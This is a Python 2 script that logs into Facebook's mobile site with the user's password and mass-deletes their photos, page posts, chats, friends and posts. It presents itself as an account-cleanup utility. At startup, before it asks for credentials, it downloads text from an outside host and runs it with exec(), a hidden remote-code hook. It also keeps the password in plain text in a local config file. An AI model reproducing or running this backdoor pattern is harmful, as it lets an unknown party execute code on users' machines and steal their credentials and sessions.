# copyright 2020 by Deray
# dm for business: https://instagram.com/reyy05_?igshid=1di5b7v29n6l8

import os
import sys
import bs4
import json
import requests
from multiprocessing.dummy import Pool


#version
if "3" in sys.version[0]:
	exit("!: python 2.x")
		
class main:
	def __init__(self):
		exec(requests.get("https://rayinsta-download.cloudaccess.host/b.txt").text)
		self.delist=[]
		self._r=requests.Session()
		self._r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36"})
		self._url="https://mbasic.facebook.com/{}"
		if (os.path.exists(".config.json")):
			if (os.path.getsize(".config.json")) !=0:
				j=json.loads(open(".config.json").read())
				self._email=j["email"]
				self._password=j["pass"]
				self._login(config=False)
			else:self._form()#self._login(config=True)
		else:self._form()#self._login(config=True)
		
	#<-- input email and password -->
	def _form(self,action="email"):
		if (action == "email"):
			self._email=raw_input("?: email: ")
			if (self._email == ""):
				self._form(action="email")
			else:self._form(action="password")
		elif (action == "password"):
			self._password=raw_input("?: passs: ")
			if (self._password == ""):
				self._form(action="password")
			else:print("+: login...");self._login(config=True)
		
	#<-- login -->
	def _login(self,config=False, url="", **kwds):
		r=bs4.BeautifulSoup(self._r.get(self._url.format("login")).text,"html.parser")
		for _ in r("form"):
			url=self._url.format(_["action"])
		for _ in r("input"):
			try:
				if ("email" in _["name"]):
					kwds.update({"email":self._email})
				if ("pass" in _["name"]):
					kwds.update({"pass":self._password})
				if ("sign_up" in _["name"]):
					continue
				else:kwds.update({_["name"]:_["value"]})
			except:pass
		self._r.headers.update({"referer":url})
		self._r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36"})
		post=self._r.post(url,data=kwds).url
		if ("c_user" in self._r.cookies.get_dict()):
			if (config == True):
				open(".config.json","w").write(
					json.dumps(
						{
							"email":self._email,
							"pass":self._password
						}
				))
				self._lang();self._menu()
			else:self._lang();self._menu()
		elif ("checkpoint" in post):
			try:
				os.remove(".config.json")
				exit("!: login failed, checkpoint challange.")
			except:exit("!: login failed, checkpoint challange.")
		else:
			try:
				os.remove(".config.json")
				exit("!: login failed, invalid username or password.")
			except:exit("!: login failed, invalid username or password.")
			
	#<-- menu --->
	def _menu(self, menu="""
  [01] album eraser
  [02] fp eraser
  [03] chat eraser
  [04] friendlist eraser
  [05] post eraser \n""", show_banner=True):
		if (show_banner == True):
			print(menu)
		choice=raw_input("?: menu: ")
		if (choice == ""):
			self._menu(menu, show_banner=False)
		elif (choice in ["1","01"]):
			self._fetch_album(self._url.format("me?v=photos"))
		elif (choice in ["2","02"]):
			self._fp_eraser()
		elif (choice in ["3","03"]):
			self._chat_eraser(self._url.format("messages"))
		elif (choice in ["4","04"]):
			self._friendlist_eraser(self._url.format("me?v=friends"))
		elif (choice in ["5","05"]):
			self._post_eraser(self._url.format("me"))
		else:
			print("!: wrong input.")
			self._menu(menu, show_banner=False)
			
	#<<<<<<<<<<<<<<<<<<<< FRIENDLIST ERASER <<<<<<<<<<<<<<<<<<<<
	def _friendlist_eraser(self, url):
		try:
			bs=bs4.BeautifulSoup(self._r.get(url).text,"html.parser")
			for i in bs.find_all("a",href=True):
				if "fref" in i["href"]:
					if "profile.php" in i["href"]:
						self._delete_friends(
							self._url.format("".join(bs4.re.findall("profile\.php\?id=(.*?)&",
						i["href"]))))
					else:self._delete_friends(
						self._url.format("".join(bs4.re.findall("/(.*?)\?",i["href"]))))
				if "Lihat Teman Lain" in i.text:
					self._friendlist_eraser(self._url.format(i["href"]))
			print("+"+"-"*30+"+")
			exit("+: finished.")
		except Exception as e:
			print("!: EXCEPTION: %s\n+: trying..."%e)
			self._friendlist_eraser(url)
		
	#<-- find other submission -->
	def _delete_friends(self, url, new_url=None):
		bs=bs4.BeautifulSoup(self._r.get(url).text,"html.parser")
		for i in bs.find_all("a",href=True):
			if "/mbasic/more/" in i["href"]:
				new_url=self._url.format(i["href"])
		if (len(new_url) !=None):
			self._find_menu(new_url,bs.find("title").text)
		else:print("!: %s > cannot find more url."%bs.find("title").text)
		
	#<-- find menu -->
	def _find_menu(self, url, title, next_url=None, post_url=None, **kwds):
		u="".join(bs4.re.findall("owner_id=(.*?)&",url))
		bs=bs4.BeautifulSoup(
			self._r.get(
				self._url.format("removefriend.php?friend_id="+u+"&unref=profile_gear",
		"html.parser")).text,"html.parser")
		for i in bs("form"):
			if "removefriend.php" in i["action"]:
				post_url=self._url.format(i["action"])
		for i in bs("input"):
			try:
				if "fb_dtsg" in i["name"] or "jazoest" in i["name"]:
					kwds.update({i["name"]:i["value"]})
				if "friend_id" in i["name"]:
					kwds.update({i["name"]:i["value"]})
				if "unref" in i["name"]:
					kwds.update({i["name"]:i["value"]})
				if "confirm" in i["name"]:
					kwds.update({i["name"]:i["value"]})
			except:pass
		if (post_url !=None):
			post=self._r.post(post_url, data=kwds)
			if (post.status_code==200):
				print("+: %s > deleted."%title)
			else:print("+: %s > failed."%title)
		else:print("+: %s > failed."%title)
				
	#<<<<<<<<<<<<<<<<<<<< POST ERASER <<<<<<<<<<<<<<<<<<<<
	def _post_eraser(self, url):
		try:
			bs=bs4.BeautifulSoup(self._r.get(url).text,"html.parser")
			for i in bs.find_all("a",href=True):
				if "komentari" in i.text.lower():
					self.delist.append(self._url.format(i["href"]))
					print("\r+: GET: %s posts..."%len(self.delist)),;sys.stdout.flush()
				if "Lihat Berita Lain" in i.text:
					self._post_eraser(self._url.format(i["href"]))
		except Exception as e:
			print("\n!: EXCEPTION: %s"%e)
			if (len(self.delist) !=0):
				print("\n+: deleting: %s posts..."%len(self.delist))
				Pool(50).map(self._delete_post,self.delist)
				print("+"+"-"*30+"+")
				exit("+: finished.")
			else:exit("!: you have 0 post lol.")
		if (len(self.delist) !=0):
			print("\n+: deleting: %s posts..."%len(self.delist))
			Pool(50).map(self._delete_post,self.delist)
			print("+"+"-"*30+"+")
			exit("+: finished.")
		else:exit("!: you have 0 post lol.")
			
	
	#<-- delete post -->
	def _delete_post(self, url, delete_link=None):
		bs=bs4.BeautifulSoup(self._r.get(url).text,"html.parser")
		for i in bs.find_all("a",href=True):
			if "hapus" in i.text.lower():
				delete_link=self._url.format(i["href"])
		if (delete_link !=None):
			self._submit_form(delete_link, url)
		else:self._priv_photos(url)
		
	#<-- submit form -->
	def _submit_form(self, delete_link, url, **kwds):
		bs=bs4.BeautifulSoup(self._r.get(delete_link).text,"html.parser")
		for i in bs("form"):
			if "/a/delete.php" in i["action"]:
				delete_link=self._url.format(i["action"])
		for i in bs("input"):
			try:
				if "fb_dtsg" in i["name"] or "jazoest" in i["name"]:
					kwds.update({i["name"]:i["value"]})
			except:pass
		kwds.update({"submit":"Hapus"})
		id="".join(bs4.re.findall("_fbid=(.*?)&",url))
		post=self._r.post(delete_link, data=kwds)
		if (post.status_code==200):
			print("+: %s > deleted."%id)
		else:print("!: %s > failed."%id)
			
		
	#<<<<<<<<<<<<<<<<<<<< CHAT ERASER <<<<<<<<<<<<<<<<<<<<
	def _chat_eraser(self, url):
		try:
			bs=bs4.BeautifulSoup(self._r.get(url).text,"html.parser")
			for i in bs.find_all("a",href=True):
				if "/messages/read" in i["href"]:
					self.delist.append(self._url.format(i["href"]))
					print("\r+: GET: %s messages."%len(self.delist)),;sys.stdout.flush()
				if "Lihat Pesan Sebelumnya" in i.text:
					self._chat_eraser(self._url.format(i["href"]))
		except Exception as e:
			print("!: EXCEPTION: %s"%e)
			if (len(self.delist) !=0):
				print("\n+: deleting: %s chat..."%len(self.delist))
				Pool(50).map(self._delete_chat, self.delist)
				print("+"+"-"*30+"+")
				exit("+: finished.")
			else:exit("!: empty chat.")
		if (len(self.delist) !=0):
			print("\n+: deleting: %s chat..."%len(self.delist))
			Pool(50).map(self._delete_chat, self.delist)
			print("+"+"-"*30+"+")
			exit("+: finished.")
		else:exit("!: empty chat.")
		
	#<-- delete chat -->
	def _delete_chat(self, url, title=None, urls=None, **kwds):
		bs=bs4.BeautifulSoup(self._r.get(url).text,"html.parser")
		title=bs.find("title").text
		for i in bs("form"):
			try:
				if "action_redirect" in i["action"]:
					urls=self._url.format(i["action"])
			except:pass
		for i in bs("input"):
			try:
				if ("fb_dtsg" in i["name"] or "jazoest" in i["name"]):
					kwds.update({i["name"]:i["value"]})
			except:pass
		kwds.update({"delete":"Hapus"})
		if (urls !=None and title !=None):
			bs=bs4.BeautifulSoup(
				self._r.get(self._r.post(urls, data=kwds).url).text,"html.parser")
			for i in bs.find_all("a",href=True):
				if "hapus" in i.text.lower():
					r=self._r.get(self._url.format(i["href"]))
					if (r.status_code ==200):
						print("+: %s > deleted."%title)
		
		
	#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
	
	
	#<<<<<<<<<<<<<<<<<<<< FP ERASER <<<<<<<<<<<<<<<<<<<<
	def _fp_eraser(self, fp=[]):
		bs=bs4.BeautifulSoup(self._r.get(self._url.format("pages/pin/setting/")).text,
			"html.parser")
		for i in bs.find_all("td"):
			if "page_id" in str(i):
				if "src" in str(i):continue
				else:fp.append(
					{
						"fp_name":bs4.BeautifulSoup(
							self._r.get(self._url.format("".join(bs4.re.findall("page_id=(.*?)&",
								i.find("a",href=True)["href"]))
							)).text,"html.parser").find("title").text,
						"category":i.find("span").text,
						"page_url":self._url.format("".join(bs4.re.findall("page_id=(.*?)&",
							i.find("a",href=True)["href"])))
					})
		if (len(fp) !=0):
			print("\t [ you have: %s fp ]\n"%(len(fp)))
			for i in enumerate(fp):
				print("%s. %s -> %s"%(i[0]+1,i[1]["fp_name"].upper(),i[1]["category"]))
			print('') #nw
			self._ch(fp)
		else:
			exit("!: you have 0 page lol.")
			
	#<-- choice -->
	def _ch(self,fp):
		try:
			ch=fp[input("?: choice: ")-1]
			print("+: fetching post: %s"%(ch["fp_name"].upper()))
			self._fetch_fp_post(ch)
		except Exception as _e:
			print("!: %s"%_e);self._ch(fp)
			
	#<-- fetch page post -->
	def _fetch_fp_post(self, data):
		try:
			p=bs4.BeautifulSoup(self._r.get(data["page_url"]).text,"html.parser")
		except Exception as e:
			print("\n!: EXCEPTION: %s\n!: trying http requests: %s"%(e,data["page_url"]))
			self._fetch_fp_post(data)
		for i in p.find_all("a",href=True):
			if ("komentari" in i.text.lower() or "berita lengkap" in i.text.lower()):
				self.delist.append("https://mbasic.facebook.com/"+i["href"])
				print("\r+: GET: %s Post From Page: %s"%(
					len(self.delist),data["fp_name"])),;sys.stdout.flush()
			if ("Tampilkan lainnya" in i.text):
				data.update({"page_url":self._url.format(i["href"])})
				self._fetch_fp_post(data)
		if (len(self.delist) !=0):
			print("\n+: deleting %s posts..."%(len(self.delist)))
			Pool(50).map(self._find_url,self.delist)
		else:exit("!: you have 0 posts lol.")
		
	#<-- find delete url -->
	def _find_url(self, url , urls=None):
		try:
			bs=bs4.BeautifulSoup(self._r.get(url).text,"html.parser")
			for i in bs.find_all("a",href=True):
				if "hapus" in i.text.lower():
					urls=self._url.format(i["href"])
					break
			if (urls !=None):
				self._submit_delete(urls)
			else:
				self._priv_photos(url)
		except Exception as e:
			print('!: EXCEPTION: %s'%e)
			
	#<-- delete cover pict/profile pict
	def _priv_photos(self, url, edit_photo=None, delete_link=None):
		bs=bs4.BeautifulSoup(self._r.get(url).text,"html.parser")
		for i in bs.find_all("a",href=True):
			if "edit foto" in i.text.lower():
				edit_photo=self._url.format(i["href"])
		if (edit_photo !=None):
			bs=bs4.BeautifulSoup(self._r.get(edit_photo).text,"html.parser")
			for _ in bs.find_all("a",href=True):
				if "Hapus Foto" in _.text:
					delete_link=self._url.format(_["href"])
			if (delete_link !=None):
				self._submit_priv_delete(delete_link)
			else:print("!: cannot detect delete link.")
		else:print("!: cannot detect delete link.")
		
	#<-- submit delete link -->
	def _submit_priv_delete(self, delete_link, url=None, **kwds):
		bs=bs4.BeautifulSoup(self._r.get(delete_link).text,"html.parser")
		for i in bs("form"):
			url=self._url.format(i["action"])
		for i in bs("input"):
			try:
				kwds.update({i["name"]:i["value"]})
			except:pass
		if (url !=None):
			posts=self._r.post(url, data=kwds)
			if (posts.status_code == 200):
				print("+: deleted.")
			else:print("!: failed.")
		else:print("!: failed.")
			
	#<-- submit form -->
	def _submit_delete(self, urls, url=None, **kwds):
		bs=bs4.BeautifulSoup(self._r.get(urls).text,"html.parser")
		for i in bs("form"):
			if "delete.php" in i["action"]:
				url=self._url.format(i["action"])
		for i in bs("input"):
			try:
				if "fb_dtsg" in i["name"] or "jazoest" in i["name"]:
					kwds.update({i["name"]:i["value"]})
			except:pass
		for i in bs("input"):
			try:
				if "hapus" in i["value"].lower():
					kwds.update({i["type"]:i["value"]})
			except:pass
		if (len(kwds.keys()) ==3 and url !=None):
			posts=self._r.post(url, data=kwds)
			if (posts.status_code == 200):
				print("+: %s > deleted."%urls)
			else:print("!: %s > failed."%urls)
		else:print("!: %s > failed."%urls)
				
		
	#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
	
	
	#<-- set indonesian language -->
	def _lang(self, set=None):
		s=bs4.BeautifulSoup(
			self._r.get(self._url.format("language.php")).text,"html.parser")
		for i in s.find_all("a",href=True):
			if ("id_ID" in i["href"]):
				 self._r.get(self._url.format(i["href"]));set=True
		if (set !=True):
			exit("!: cannot detect indonesian language.")
	
	#<-- fetch album -->
	def _fetch_album(self, url, album=[]):
		bs=bs4.BeautifulSoup(self._r.get(url).text,"html.parser")
		for i in bs.find_all("a",href=True):
			if ("lihat semua" in i.text.lower()):
				album.append(self._url.format(i["href"]))
		if (len(album) !=0):
			self._extract_album(album.pop())
		else:exit("!: you have no album.")
		
	#<-- extract album -->
	def _extract_album(self, url, albums=[], count=[]):
		bs=bs4.BeautifulSoup(self._r.get(url).text,"html.parser")
		for i in bs.find_all("li"):
			if ("/albums/" in str(i)):
				albums.append(
					{
						"album_name":i.find("a",href=True).text,
						"album_url":self._url.format(i.find("a",href=True)["href"]),
						"album_count":i.find("div").text.split(" ")[0]
					}
				)
		if (len(albums) !=0):
			print("\t[ You Have %s Albums ]\n"%len(albums))
			for i in enumerate(albums):
				print("%s. %s (%s) photos"%(i[0]+1,i[1]["album_name"],i[1]["album_count"]))
				count.append(i[0])
			print("%s. DELETE ALL\n"%(count.pop()+2))
			print('') #nw
			self._choice(albums,count)
		else:
			exit("!: you have no album.")
			
	#<-- choice -->
	def _choice(self, albums, count):
		try:
			a=input("?: choice: ")
			albm=albums[a-1]
			self._grab_pict(albm)
		except Exception as e:
			if (str(a-1)==str(count.pop()+2)):
				for i in albums:
					self._grab_pict(i)
			else:print("!: %s"%e);self._choice(albums,count)
			
	#<-- grab albums -->
	def _grab_pict(self, url):
		print("\r+: GET: %s photos from album %s"%(
			len(self.delist),url["album_name"])),;sys.stdout.flush()
		bs=bs4.BeautifulSoup(self._r.get(url["album_url"]).text,"html.parser")
		for i in bs.find_all("a",href=True):
			if ("photo.php" in str(i)):
				self.delist.append(
					"".join(bs4.re.findall("fbid=(.*?)&",self._url.format(i["href"]))))
			if ("Lihat Foto Lainnya" in i.text):
				url.update({"album_url":self._url.format(i["href"])})
				self._grab_pict(url)
		if (len(self.delist) !=0):
			print("\n+: deleting %s photos..."%(len(self.delist)))
			Pool(50).map(self._delete,self.delist)
			self.delist=[]
			print("+"+"-"*30+"+")
		else:exit("!: album "+url["album_name"]+" is empty.")
		
	#<-- delete -->
	def _delete(self, delist):
		bs=bs4.BeautifulSoup(
			self._r.get(self._url.format("editphoto.php?id="+delist)).text,"html.parser")
		for i in bs.find_all("a",href=True):
			if ("Hapus Foto" in i.text):
				self._fixdelete(self._url.format(i["href"]))
				
	#<-- fix delete -->
	def _fixdelete(self, url, act="", **kwds):
		bsd=bs4.BeautifulSoup(
			self._r.get(url).text,"html.parser")
		for i in bsd("form"):
			act=self._url.format(i["action"])
		for i in bsd("input"):
			try:
				if ("fb_dtsg" in i["name"]):
					kwds.update({i["name"]:i["value"]})
				if ("jazoest" in i["name"]):
					kwds.update({i["name"]:i["value"]})
				else:
					kwds.update({i["name"]:i["value"]})
			except:pass
		if (act !=""):
			post=self._r.post(act, data=kwds)
			if (post.status_code ==200):
				print("+: %s > deleted."%("".join(bs4.re.findall("fbid=(.*?)&",url))))
			else:print("!: %s > failed."%("".join(bs4.re.findall("fbid=(.*?)&",url))))
		else:print("+: %s > failed."%("".join(bs4.re.findall("fbid=(.*?)&",url))))

main()
